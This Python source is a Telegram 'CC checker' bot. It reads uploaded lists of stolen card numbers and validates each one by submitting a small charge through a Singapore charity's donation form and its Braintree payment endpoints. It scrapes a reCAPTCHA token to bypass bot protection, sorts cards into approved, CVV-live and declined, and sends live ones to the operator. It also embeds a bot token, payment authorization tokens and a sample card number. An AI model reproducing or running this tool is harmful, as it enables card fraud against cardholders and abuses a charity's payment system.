import requests
import telebot
from telebot import types
from datetime import datetime, timedelta
import time
import json
from datetime import datetime, timedelta
import datetime
import time
import random
now = datetime.datetime.today()
now = datetime.datetime.today()
mm = str(now.month)
dd = str(now.day)
yyyy = str(now.year)
hour = str(now.hour)
mi = str(now.minute)
ss = str(now.second)
t = hour + ':'+ mi +':' + ss + ' '+'0'+mm + '-' + dd + '-' + yyyy 
hours = now.hour
ran= ['45','56','34','12','66','67','90','89','44','65','32','97','58']
pr =random.choice(ran)

s=requests.Session()

token ='6766017890:AAE74v_5JlgI-4SfW67UJBNURuEbIgxWhgI'
#"6303000031:AAGq3oOsx3Z7dWcHYy3OqHATTflP6pTQyKY"
bot=telebot.TeleBot(token,parse_mode="HTML")


def StripeChargebot(ccx):
	import time
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm= ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	bin=n[:6]
	if "20" in yy:
		yy = yy.split("20")[1]
	anchor = "https://www.google.com/recaptcha/api2/anchor?ar=1&k=6LcuKaUoAAAAANQYCGJywRenpiRDwPvnJlGn08sj&co=aHR0cHM6Ly90b3VjaC5vcmcuc2c6NDQz&hl=ar&v=V6_85qpc2Xf2sbe3xTnRte7m&size=invisible&cb=2aqs6wxycgcq"
	reloading = "https://www.google.com/recaptcha/api2/reload?k=6LcuKaUoAAAAANQYCGJywRenpiRDwPvnJlGn08sj"
	rq = requests.get(url=anchor)
	resp = (rq.text)


	inicio = resp.find('input type="hidden" id="recaptcha-token" value="') + 1
	fin = resp.find('">', inicio)
	valor = resp[inicio:fin]
	valore = valor[47:]
	token = valore

	

	postdata = {
		'v':'V6_85qpc2Xf2sbe3xTnRte7m',
		'reason':'q',
		'c':token
	}

	#Recaptvchav3 Token 2 post
	user_POST = requests.post(url=reloading, data=postdata)
	resp2 = (user_POST.text)


	inicio = resp2.find('"rresp"') + 1
	fin = resp2.find('["bgdata"', inicio)
	valor = resp2[inicio:fin]
	valore = valor[8:-26]
	token2 = valore
	s=requests.session()
	headers = {
		'authority': 'payments.braintree-api.com',
		'accept': '*/*',
		'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
		'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MTUyOTIzODAsImp0aSI6IjNiOTdlNTM5LTI2OTctNDc3My04ZjI2LWI5NmFhZTVhMWRhMCIsInN1YiI6Ims2NnR3a3hyZnk5MmNqdGsiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Ims2NnR3a3hyZnk5MmNqdGsiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.kQeum52j097yafSBo6ftfB-zs-8M0JFZ7-hDYNwu4EjNwxQSvE36VUMRESipVSZ-Ib9Wb6eoNVYOCVclQ1rXbw',
		'braintree-version': '2018-05-10',
		'content-type': 'application/json',
		'origin': 'https://assets.braintreegateway.com',
		'referer': 'https://assets.braintreegateway.com/',
		'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
		'sec-ch-ua-mobile': '?1',
		'sec-ch-ua-platform': '"Android"',
		'sec-fetch-dest': 'empty',
		'sec-fetch-mode': 'cors',
		'sec-fetch-site': 'cross-site',
		'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	json_data = {
		'clientSdkMetadata': {
			'source': 'client',
			'integration': 'custom',
			'sessionId': 'cc35b25d-e72f-4adb-85dd-036dfef342fb',
		},
		'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {	 token	 creditCard {	   bin	   brandCode	   last4	   cardholderName	   expirationMonth	  expirationYear	  binData {		 prepaid		 healthcare		 debit		 durbinRegulated		 commercial		 payroll		 issuingBank		 countryOfIssuance		 productId	   }	 }   } }',
		'variables': {
			'input': {
				'creditCard': {
					'number': n,
					'expirationMonth': mm,
					'expirationYear': '20'+yy,
					'cvv': cvc,
					'cardholderName': 'Mohamed Hadid',
				},
				'options': {
					'validate': False,
				},
			},
		},
		'operationName': 'TokenizeCreditCard',
	}
	
	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	token =(response.json()['data']['tokenizeCreditCard']['token'])
	print(token)
	# Note: json_data will not be serialized by requests
	# exactly as it was in the original request.
	#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"cc35b25d-e72f-4adb-85dd-036dfef342fb"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {	 token	 creditCard {	   bin	   brandCode	   last4	   cardholderName	   expirationMonth	  expirationYear	  binData {		 prepaid		 healthcare		 debit		 durbinRegulated		 commercial		 payroll		 issuingBank		 countryOfIssuance		 productId	   }	 }   } }","variables":{"input":{"creditCard":{"number":"4347698053126806","expirationMonth":"11","expirationYear":"2028","cvv":"555","cardholderName":"Mohamed Hadid"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
	#response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)
	headers = {
		'authority': 'api.braintreegateway.com',
		'accept': '*/*',
		'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
		'content-type': 'application/json',
		'origin': 'https://touch.org.sg',
		'referer': 'https://touch.org.sg/',
		'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
		'sec-ch-ua-mobile': '?1',
		'sec-ch-ua-platform': '"Android"',
		'sec-fetch-dest': 'empty',
		'sec-fetch-mode': 'cors',
		'sec-fetch-site': 'cross-site',
		'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	json_data = {
		'amount': 100,
		'additionalInfo': {},
		'bin': bin,
		'dfReferenceId': '0_026d79ad-ca88-41f8-9ac0-3b1628163c00',
		'clientMetadata': {
			'requestedThreeDSecureVersion': '2',
			'sdkVersion': 'web/3.97.1',
			'cardinalDeviceDataCollectionTimeElapsed': 25,
			'issuerDeviceDataCollectionTimeElapsed': 6703,
			'issuerDeviceDataCollectionResult': True,
		},
		'authorizationFingerprint': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MTUyOTIzODAsImp0aSI6IjNiOTdlNTM5LTI2OTctNDc3My04ZjI2LWI5NmFhZTVhMWRhMCIsInN1YiI6Ims2NnR3a3hyZnk5MmNqdGsiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Ims2NnR3a3hyZnk5MmNqdGsiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.kQeum52j097yafSBo6ftfB-zs-8M0JFZ7-hDYNwu4EjNwxQSvE36VUMRESipVSZ-Ib9Wb6eoNVYOCVclQ1rXbw',
		'braintreeLibraryVersion': 'braintree/web/3.97.1',
		'_meta': {
			'merchantAppId': 'touch.org.sg',
			'platform': 'web',
			'sdkVersion': '3.97.1',
			'source': 'client',
			'integration': 'custom',
			'integrationType': 'custom',
			'sessionId': 'cc35b25d-e72f-4adb-85dd-036dfef342fb',
		},
	}
	
	response = requests.post(
		f'https://api.braintreegateway.com/merchants/k66twkxrfy92cjtk/client_api/v1/payment_methods/{token}/three_d_secure/lookup',
		headers=headers,
		json=json_data,
	)
	#print(response.json())
	non=response.json()['paymentMethod']['nonce']
	print(non)
	# Note: json_data will not be serialized by requests
	# exactly as it was in the original request.
	#data = '{"amount":100,"additionalInfo":{},"bin":"434769","dfReferenceId":"0_026d79ad-ca88-41f8-9ac0-3b1628163c00","clientMetadata":{"requestedThreeDSecureVersion":"2","sdkVersion":"web/3.97.1","cardinalDeviceDataCollectionTimeElapsed":25,"issuerDeviceDataCollectionTimeElapsed":6703,"issuerDeviceDataCollectionResult":true},"authorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MTUyOTIzODAsImp0aSI6IjNiOTdlNTM5LTI2OTctNDc3My04ZjI2LWI5NmFhZTVhMWRhMCIsInN1YiI6Ims2NnR3a3hyZnk5MmNqdGsiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Ims2NnR3a3hyZnk5MmNqdGsiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.kQeum52j097yafSBo6ftfB-zs-8M0JFZ7-hDYNwu4EjNwxQSvE36VUMRESipVSZ-Ib9Wb6eoNVYOCVclQ1rXbw","braintreeLibraryVersion":"braintree/web/3.97.1","_meta":{"merchantAppId":"touch.org.sg","platform":"web","sdkVersion":"3.97.1","source":"client","integration":"custom","integrationType":"custom","sessionId":"cc35b25d-e72f-4adb-85dd-036dfef342fb"}}'
	#response = requests.post(
	#	'https://api.braintreegateway.com/merchants/k66twkxrfy92cjtk/client_api/v1/payment_methods/tokencc_bh_f458q2_hsktzd_n2m4fp_rcr6kc_6z8/three_d_secure/lookup',
	#	headers=headers,
	#	data=data,
	#)
	cookies = {
		'affinity': 'd9537e9a0ada3a1d',
	}
	
	headers = {
		'Host': 'touch.org.sg',
		# 'content-length': '205',
		'sec-ch-ua': 'Chromium;v=124, Google',
		'correlation-id': '64f0ad32-7854-4ae0-ae64-d5a608de091c',
		'x-csrf-token': 'undefined',
		'sec-ch-ua-mobile': '?1',
		'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
		'content-type': 'application/json',
		'csrf-token': 'undefined',
		'sec-ch-ua-platform': 'Android',
		'accept': '*/*',
		'origin': 'https://touch.org.sg',
		'sec-fetch-site': 'same-origin',
		'sec-fetch-mode': 'cors',
		'sec-fetch-dest': 'empty',
		'referer': 'https://touch.org.sg/donation?cause=862660000&frequency=1&type=3&indFullName=&indFin=&indEmail=&indPhone=&postCode=&buildingNo=&unitNo=&dob-date=&dob-month=&dob-year=&corpUen=&corpCompany=&postCode=&buildingNo=&unitNo=&corpFullName=&corpEmail=&corpPhone=&corpDept=&anonEmail=&paymentType=3',
		# 'accept-encoding': 'gzip, deflate, br, zstd',
		'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
		# 'cookie': 'affinity=d9537e9a0ada3a1d',
		'priority': 'u=1, i',
	}
	
	data = '{donationFrequency:1,donatedAs:3,modeOfPayment:3,supportedCause:862660000,channelDonation:1,channelCampaignId:,email:wwww.ali@gmail.com,amountBaseAnon:200,otherAmountAnon:0}'
	params = {
		'g-recaptcha-response': token2,
	}
	response = requests.post(
		'https://touch.org.sg/content/touchprogram/sg/donation-form/jcr:content/root/container/container/donationform.submit.json',
		params=params,
		cookies=cookies,
		headers=headers,
		data=data,
	).text
	#print(response)
	
	
	
	######
	cookies = {
		'affinity': '"0a55a6be99714719"',
		'_ga_LLJZZN5G1Q': 'GS1.1.1715205975.1.0.1715205975.60.0.0',
		'_ga': 'GA1.3.1571749903.1715205975',
		'_gid': 'GA1.3.1960125267.1715205976',
		'_fbp': 'fb.2.1715205977440.2146210293',
		'_gcl_au': '1.1.876075029.1715200870.1717674362.1715206000.1715206149',
	}
	
	headers = {
		'authority': 'touch.org.sg',
		'accept': '*/*',
		'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
		'content-type': 'application/json',
		# 'cookie': 'affinity="0a55a6be99714719"; _ga_LLJZZN5G1Q=GS1.1.1715205975.1.0.1715205975.60.0.0; _ga=GA1.3.1571749903.1715205975; _gid=GA1.3.1960125267.1715205976; _fbp=fb.2.1715205977440.2146210293; _gcl_au=1.1.876075029.1715200870.1717674362.1715206000.1715206149',
		'correlation-id': '10530fb4-0a83-48b4-a03e-c726a83f4017',
		'csrf-token': 'undefined',
		'origin': 'https://touch.org.sg',
		'referer': 'https://touch.org.sg/donation?cause=862660000&frequency=1&type=3&indFullName=&indFin=&indEmail=&indPhone=&postCode=&buildingNo=&unitNo=&dob-date=&dob-month=&dob-year=&corpUen=&corpCompany=&postCode=&buildingNo=&unitNo=&corpFullName=&corpEmail=&corpPhone=&corpDept=&anonEmail=&paymentType=3',
		'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
		'sec-ch-ua-mobile': '?1',
		'sec-ch-ua-platform': '"Android"',
		'sec-fetch-dest': 'empty',
		'sec-fetch-mode': 'cors',
		'sec-fetch-site': 'same-origin',
		'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
		'x-csrf-token': 'undefined',
	}
	
	json_data = {
		'amount': 100,
		'deviceData': '{"correlation_id":"cf060ddda034fb57c59798e4bc69ee70"}',
		'paymentMethodNonce': non,
		'donationFrequency': '1',
		'donationId': 'd6bab43c-870d-ef11-9f89-0022481a0d20',
		'transactionId': 'eabab43c-870d-ef11-9f89-0022481a0d20',
		'modeOfPayment': '3',
		'email': 'wwww.ali867@gmail.com',
	}
	
	req = requests.post(
		'https://touch.org.sg/content/touchprogram/sg/donation-form/jcr:content/root/container/container/donationform.checkout.json',
		cookies=cookies,
		headers=headers,
		json=json_data,
	)
	print(req.json()['message'])
	if 'Rejected' in req.text:
		ms = 'risk'
		return ms
		time.sleep(15)
	try:
		msg = req.json()['message']
		print(ccx,'¦',msg)
		if "insufficient" in req.json()['message']:
			ms = 'Your card has insufficient funds.'
			return ms
		else:
			ms = req.json()['message']
			return ms
	except:
		if 'requires_action' in req.text or 'Fraud Suspected' in req.text:
			ms = '3D Required'
			return ms
		else:
			return req.json()
@bot.message_handler(commands=["start"])
def start(message):
	bot.reply_to(message,'''- Welcome Dear ♡!
You are Subscribed KilwaChk BOT ♕!
Send Me The Combo Visa File To Check it

Gate - Stripr Charge 15$ ViP ♕ .
Programmer - @Lx0b2''')
@bot.message_handler(content_types=["document"])
def main(message):
	dd = 0
	rs = 0
	rsk = 0
	cek = 0
	nop = 0
	live = 0
	ch = 0
	ko = (bot.reply_to(message,"Please Wait Status Processing...⌛").message_id)
	ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
	with open("combo.txt", "wb") as w:
		w.write(ee)
	try:
		with open("combo.txt", 'r') as file:
			lino = file.readlines()
			total = len(lino)
			for cc in lino:
				try:
					url = ('https://lookup.binlist.net/'+cc[:6])
					data = requests.get(url).json()
					
				except:
					pass
				try:
					bank=(data['bank']['name'])
				except:
					bank=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
				try:
					emj=(data['country']['emoji'])
				except:
					emj=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
				try:
					cn=(data['country']['name'])
				except:
					cn=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
				try:
					dicr=(data['scheme'])
				except:
					dicr=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
				try:
					typ=(data['type'])
				except:
					typ=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
				try:
					url=(data['bank']['url'])
				except:
					url=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
				try:
					bran = (data['brand'])
				except:
					bran = ('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
				#	start_time = time.time()

				
				start_time = time.time()
				try:
					last = str(StripeChargebot(cc))
				except Exception as e:
					print(e)
					last=e
				mes = types.InlineKeyboardMarkup(row_width=1)
				cm1 = types.InlineKeyboardButton(f"-> {last}", callback_data='u8')
				cm2 = types.InlineKeyboardButton(f"-> {cc}", callback_data='u8')
				cm3 = types.InlineKeyboardButton(f"- Charged ✅ -> {ch} ", callback_data='x')
				cm4 = types.InlineKeyboardButton(f"- Approved ✅ -> {live} ", callback_data='x')
				cm7 = types.InlineKeyboardButton(f"- Cvv ✅ -> {rs} ", callback_data='x')
				cm5 = types.InlineKeyboardButton(f"- Declined ❌ -> {dd} ", callback_data='x')
				cm8 = types.InlineKeyboardButton(f"- Risk Wait ❌ -> {rsk} ", callback_data='x')
				cm10 = types.InlineKeyboardButton(f"- Incorrect CC ❌ -> {nop} ", callback_data='x')
				cm6 = types.InlineKeyboardButton(f"- All -> {total}/{cek}", callback_data='x')
				mes.add(cm1, cm2, cm3, cm4, cm7,cm5,cm8,cm10,cm6)
				bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''Please Wait Checking Your Cards !.
Programeer - @Lx0b2 🧸 ''', reply_markup=mes)
				end_time = time.time()
				execution_time = end_time - start_time
				msg = f'''
<strong>- Hello Boss New Approved Card ✅
--------------------------------------------
- GateWay -> Stripe Charge 15 ViP ♕ .
- Message -> {last}
--------------------------------------------
• Card •<code> {cc}</code>
--------------------------------------------
- Info -|:
- THE BIN • <code>{cc[:6]}</code>
• <code>{bank}</code>
• <code>{dicr}  - {bran}</code>
• <code>{cn} -  [{emj}]</code>
--------------------------------------------
- Process Time : <code>{"{:.1f}".format(execution_time)} seconds </code>
- Process Date : <code>{t}</code>
--------------------------------------------
- Programmer • @Lx0b2</strong>'''
				msgcvc = f'''
<strong>- Hello Boss New Cvv Card ✅
--------------------------------------------
- GateWay -> Stripe Charge 15 ViP ♕ .
- Message -> {last}
--------------------------------------------
• Card •<code> {cc}</code>
--------------------------------------------
- Info -|:
- THE BIN • <code>{cc[:6]}</code>
• <code>{bank}</code>
• <code>{dicr}  - {bran}</code>
• <code>{cn} -  [{emj}]</code>
--------------------------------------------
- Process Time : <code>{"{:.1f}".format(execution_time)} seconds </code>
- Process Date : <code>{t}</code>
--------------------------------------------
- Programmer • @Lx0b2</strong>'''
				if 'Declined - Call Issuer'  or 'Call Issuer' in last:
					dd += 1
					cek+=1
					time.sleep(15)
				elif 'Your card number is incorrect.' in last:
					nop += 1
					cek+=1
					time.sleep(15)
				elif 'error' in last:
					nop += 1
					cek+=1
					time.sleep(15)
				elif "3D Required" in last:
					rs+=1
					cek+=1
					bot.reply_to(message, msgcvc)
					time.sleep(15)
				elif "CVV" in last:
					rs+=1
					cek+=1
					bot.reply_to(message, msgcvc)
					time.sleep(15)
				elif 'risk' in last:
					rsk+=1
					cek+=1
					time.sleep(15)
				elif 'insufficient' in last:
					live+=1
					cek+=1
					bot.reply_to(message, msg)
					time.sleep(15)
				else:
					ch += 1
					cek+=1
					msg1 = f'''
<strong>- Hello Boss New Approved Charge Card ✅
--------------------------------------------
- GateWay -> Stripe Charge 15 ViP ♕ .
- Message -> {last}
--------------------------------------------
• Card •<code> {cc}</code>
--------------------------------------------
- Info -|:
- THE BIN • <code>{cc[:6]}</code>
• <code>{bank}</code>
• <code>{dicr}  - {bran}</code>
• <code>{cn} -  [{emj}]</code>
--------------------------------------------
- Process Time : <code>{"{:.1f}".format(execution_time)} seconds </code>
- Process Date : <code>{t}</code>
--------------------------------------------
- Programmer • @Lx0b2</strong>'''
					bot.reply_to(message, msg1)
					time.sleep(15)
	except Exception as eo:
		print(eo)
print("تم تشغيل البوت")
bot.polling()
